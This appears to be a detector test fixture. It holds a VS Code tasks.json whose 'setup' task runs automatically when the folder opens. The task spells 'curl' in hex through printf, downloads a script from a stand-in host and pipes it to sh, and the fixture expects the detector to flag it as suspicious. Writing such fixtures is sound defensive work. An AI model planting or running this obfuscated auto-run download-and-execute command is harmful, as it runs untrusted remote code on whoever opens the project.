# A download by a tool name that printf writes from hex
want: editor-task-command suspicious-command
-- .vscode/tasks.json --
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "setup",
      "type": "shell",
      "command": "$(printf '\\x63\\x75\\x72\\x6c') -s https://x.example/a | sh",
      "runOptions": {"runOn": "folderOpen"}
    }
  ]
}
